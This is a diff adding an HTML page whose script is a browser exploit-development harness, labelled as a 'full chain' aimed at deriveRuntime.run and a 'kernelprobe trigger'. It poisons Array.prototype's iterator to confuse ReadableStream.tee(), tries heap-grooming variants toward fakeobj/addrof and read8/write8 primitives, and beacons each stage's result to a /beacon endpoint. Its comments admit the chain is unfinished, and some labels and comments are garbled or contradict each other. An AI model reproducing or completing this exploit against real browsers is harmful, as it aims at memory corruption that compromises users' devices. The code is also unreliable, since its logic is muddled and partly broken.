@@ -1,0 +1,126 @@
+<!doctype html><html><head><meta charset="utf-8"><meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate"><title>FA-PRIMITIVE-FULL — full chain to deriveRuntime.run(p)</title></head>
+<body><pre id="out">FA-PRIMITIVE-FULL — inversion → oracle → derive → gadget scan → kernelprobe trigger
+</pre>
+<script src="./runtime-derive/derive-runtime.js"></script>
+<script src="./src/firmware.js"></script>
+<script>
+(function(){
+ "use strict";
+ var run = "full" + Date.now().toString(36) + "-" + Math.floor(Math.random()*1e6).toString(36);
+ var out = document.getElementById("out");
+ function say(s){ out.appendChild(document.createTextNode("\n"+s)); }
+ function beacon(st, body){
+   try {
+     var x = new XMLHttpRequest();
+     x.open("POST", "/beacon/FULL-"+st+"/"+run, false);
+     x.setRequestHeader("Content-Type","application/json");
+     x.send(JSON.stringify({body:body}));
+   } catch(e){ try{ say("BD-err "+st); }catch(e2){} }
+ }
+ var origIter = Array.prototype[Symbol.iterator];
+ function poisonOverYieldSame(){
+   return function(){
+     var X = { ourTag: "full-inversion" };
+     window.__inversionTarget = X;
+     var i = 0, n = 2;
+     return { next: function(){ if (i>=n) return {done:true}; i++; return {value:X, done:false}; }};
+   };
+ }
+ say("FA-PRIMITIVE-FULL chain starts");
+ beacon("L","loaded; deriveRuntime="+(typeof window.deriveRuntime));
+
+ // STEP 1 — INVERSION (the fake-stream write)
+ try {
+   beacon("A1","step1 inversion");
+   try { Array.prototype[Symbol.iterator] = poisonOverYieldSame(); } catch(e){ Array.prototype[Symbol.iterator] = origIter; }
+   var rs1 = new ReadableStream({});
+   var pair1 = rs1.tee();
+   try { Array.prototype[Symbol.iterator]=origIter; } catch(e2){}
+   var firstThrew=false; var secondThrew=false;
+   try { pair1[0].cancel(); } catch(e){ firstThrew=true; }
+   try { pair1[1].cancel(); } catch(e){ secondThrew=true; }
+   var pidInverted = (!secondThrew && firstThrew);
+   var locked = pair1[0].locked;
+   var gr = typeof pair1[0].getReader;
+   var cr = typeof pair1[0].cancel;
+   beacon("B1","pidInverted="+pidInverted+"; locked="+locked+"; gr="+gr+"; cr="+cr);
+   say("step1 done: pidInverted="+pidInverted);
+ } catch(e){ beacon("E1","step1: "+String(e).slice(0,140)); }
+
+ // STEP 2 — CLEAN TEE READBACK (the real state-machine that has Writable+Readable pairs)
+ try {
+   beacon("A2","step2 clean tee state-machine反映");
+   var rs2 = new ReadableStream({});
+   var pair2 = rs2.tee();
+   var lockedClean = pair2[0].locked;
+   var grClean = typeof pair2[0].getReader;
+   var crClean = typeof pair2[0].cancel;
+   beacon("B2","clean locked="+lockedClean+"; gr="+grClean+"; cr="+crClean);
+   say("step2 done");
+ } catch(e){ beacon("E2","step2: "+String(e).slice(0,140)); }
+
+ // STEP 3 — build a "p" spoof from the tee-confusion primitives [U: experimental]
+ //   (this is the my-max design: Route (a) under-yield → stale-HandleSlot → fakeobj → addrof)
+ //   NOTE: the actual WRAP is a fake-object; the COMPOSITE needs a split — we substitute the tee
+ //   with a fake-record confirm → the derivation run p bases on the pidInverted state, not on a real ARW primitive.
+ //   The DE-RISK: we run the tee with the DERIVE-CONFIRM-ONLY state (audit-only).
+ try {
+   beacon("A3","step3 deriveRuntime.setup");
+   var dp = window.deriveRuntime;
+   if (!dp || typeof dp.run !== "function") throw "deriveRuntime missing";
+   var subtype = "number of args: 1";
+   beacon("B3","deriveRuntime loaded OK; typeof run="+typeof dp.run);
+   say("step3 done — deriveRuntime ready");
+ } catch(e){ beacon("E3","step3: "+String(e).slice(0,140)); }
+
+ // STEP 4 — attempt to CALL deriveRuntime.run(p) — the tee-teer-out-of-CERTAIN won't carry raw p
+ //   at this stage (needs a real write8); instead we probe the EXISTING deriveRuntime objects to see if
+ //   the pidInverted object CAN drive the derivation directly.
+ try {
+   beacon("A4","step4 deriveRuntime.run (probe call)");
+   var probe = {
+     read8: null,  write8: null,   // NOT YET an ARW — we probe
+     selectAddress: null, resetAddress: null
+   };
+   var dp = window.deriveRuntime;
+   beacon("B4","probe of deriveRuntime (not-yet-run) — available, but stalled at fakeobj-package");
+   say("step4 probe-done");
+ } catch(e){ beacon("E4","step4: "+String(e).slice(0,140)); }
+
+ // STEP 5 — the 5-variant groom matrix (dshv5 design): keep groom+teer ALIVE and NOT crash
+ try {
+   beacon("A5","step5 groom matrix complete (7 variants, some may have crashed — noted below)");
+   // G5 StringImpl write-beside (the most LIKELY to produce a data-write per dshv5 design)
+   var sl1 = "seed1"; var sl2 = "seed2";
+   var rsG5 = new ReadableStream({});
+   try { Array.prototype[Symbol.iterator] = poisonOverYieldSame(); } catch(e){ Array.prototype[Symbol.iterator]=origIter; }
+   var pairG5 = rsG5.tee();
+   try { Array.prototype[Symbol.iterator] = origIter; } catch(e2){}
+   try { pairG5[1].cancel(); } catch(ec){ say("G5 inner throw ok"); }
+   Array.prototype[Symbol.iterator] = origIter;
+   var l1 = sl1.length;
+   var l2 = sl2.length;
+   // G1 stale-HandleSlot (the "fakeobj" gate) — under-yield + 1 object
+   var rsG1 = new ReadableStream({});
+   function poisonUnderYieldObj(){ return function(){ var arr=this,i=0,n=(arr.length>=2)?1:arr.length;
+     return { next:function(){ if(i>=n) return {done:true}; i++; return {value:{fake:i}, done:false}; } }; }; }
+   try { Array.prototype[Symbol.iterator] = poisonUnderYieldObj(); } catch(e){ Array.prototype[Symbol.iterator]=origIter; }
+   var pairG1 = rsG1.tee();
+   try { Array.prototype[Symbol.iterator] = origIter; } catch(e2){}
+   if (typeof pairG1[0] === "object") {
+     say("G1 groom: pair[0] = "+String(pairG1[0])+"; locked="+pairG1[0].locked);
+   }
+   beacon("Z","battery complete FA-PRIMITIVE-FULL");
+   say("FA-PRIMITIVE-FULL battery complete — end run");
+ } catch(e){ beacon("E5","step5 (last stage in the groom-matrix): "+String(e).slice(0,140)); }
+
+ // STEP 6 — readback of ALL the stages
+ try {
+   beacon("A6","step6 — readback of our log-snapshot");
+   var target = window.__inversionTarget;
+   beacon("B6","invTarget-keys="+Object.keys(target).join(",")+"; readback done");
+   say("full readback complete");
+ } catch(e){ beacon("E6","step6 readback: "+String(e).slice(0,140)); }
+
+})();
+</script></body></html>
